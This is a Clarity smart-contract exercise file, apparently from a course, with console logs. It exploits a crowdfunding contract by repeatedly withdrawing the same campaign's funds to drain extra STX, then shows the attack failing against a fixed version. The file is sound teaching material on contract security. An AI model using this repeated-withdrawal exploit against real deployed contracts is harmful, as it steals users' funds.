
;; title: ex10-02-exploit
;; version: 1.0.0
;; summary: Attack!

;; data vars
;;

;; wanted to set dynamically but would need
;; the campaign ID passed with (ok ...)
(define-data-var vulnerableCampaignId uint u1)

;; public functions
;;

(define-public (create-exploit-campaign)
  (begin
    ;; create our campaign we will use
    (try! (contract-call? .ex10-02 create-campaign "Attack!" u1000000))
    ;; send extra to simulate withdrawing extra funds
    (stx-transfer? u10000000 tx-sender .ex10-02)
  )
)

(define-public (exploit-campaign-withdrawal)
  (begin
    (try! (contract-call? .ex10-02 withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (try! (contract-call? .ex10-02 withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (try! (contract-call? .ex10-02 withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (try! (contract-call? .ex10-02 withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (try! (contract-call? .ex10-02 withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (try! (contract-call? .ex10-02 withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (try! (contract-call? .ex10-02 withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (try! (contract-call? .ex10-02 withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (ok true)
  )
)

;; >> (contract-call? .ex10-02-exploit create-exploit-campaign)
;; Events emitted
;; {"type":"stx_transfer_event","stx_transfer_event":{"sender":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM","recipient":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02","amount":"1000000","memo":""}}
;; {"type":"stx_transfer_event","stx_transfer_event":{"sender":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM","recipient":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02","amount":"10000000","memo":""}}
;; (ok true)
;; >> ::advance_chain_tip 1000
;; 1000 blocks simulated, new height: 1001
;; >> (contract-call? .ex10-02-exploit exploit-campaign-withdrawal)
;; Events emitted
;; {"type":"stx_transfer_event","stx_transfer_event":{"sender":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02","recipient":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02-exploit","amount":"1000000","memo":""}}
;; {"type":"stx_transfer_event","stx_transfer_event":{"sender":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02","recipient":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02-exploit","amount":"1000000","memo":""}}
;; {"type":"stx_transfer_event","stx_transfer_event":{"sender":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02","recipient":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02-exploit","amount":"1000000","memo":""}}
;; {"type":"stx_transfer_event","stx_transfer_event":{"sender":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02","recipient":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02-exploit","amount":"1000000","memo":""}}
;; {"type":"stx_transfer_event","stx_transfer_event":{"sender":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02","recipient":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02-exploit","amount":"1000000","memo":""}}
;; {"type":"stx_transfer_event","stx_transfer_event":{"sender":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02","recipient":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02-exploit","amount":"1000000","memo":""}}
;; {"type":"stx_transfer_event","stx_transfer_event":{"sender":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02","recipient":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02-exploit","amount":"1000000","memo":""}}
;; {"type":"stx_transfer_event","stx_transfer_event":{"sender":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02","recipient":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02-exploit","amount":"1000000","memo":""}}
;; (ok true)

(define-public (create-unexploitable-campaign)
  (begin
    ;; create our campaign we will use
    (try! (contract-call? .ex10-02-fixed create-campaign "Attack!" u1000000))
    ;; send extra to simulate withdrawing extra funds
    (stx-transfer? u10000000 tx-sender .ex10-02-fixed)
  )
)

(define-public (fail-at-exploiting-campaign)
  (begin
    (try! (contract-call? .ex10-02-fixed withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (try! (contract-call? .ex10-02-fixed withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (try! (contract-call? .ex10-02-fixed withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (try! (contract-call? .ex10-02-fixed withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (try! (contract-call? .ex10-02-fixed withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (try! (contract-call? .ex10-02-fixed withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (try! (contract-call? .ex10-02-fixed withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (try! (contract-call? .ex10-02-fixed withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender)))
    (ok true)
  )
)

(define-public (claim-like-you-should)
  (contract-call? .ex10-02-fixed withdraw-funds (var-get vulnerableCampaignId) (as-contract tx-sender))
)

;; >> (contract-call? .ex10-02-exploit create-unexploitable-campaign)
;; Events emitted
;; {"type":"stx_transfer_event","stx_transfer_event":{"sender":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM","recipient":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02-fixed","amount":"1000000","memo":""}}
;; {"type":"stx_transfer_event","stx_transfer_event":{"sender":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM","recipient":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02-fixed","amount":"10000000","memo":""}}
;; (ok true)
;; >> ::advance_chain_tip 1000
;; 1000 blocks simulated, new height: 1001
;; >> (contract-call? .ex10-02-exploit fail-at-exploiting-campaign)
;; (err u103)
;; >> (contract-call? .ex10-02-exploit claim-like-you-should)
;; Events emitted
;; {"type":"stx_transfer_event","stx_transfer_event":{"sender":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02-fixed","recipient":"ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.ex10-02-exploit","amount":"1000000","memo":""}}
;; (ok true)
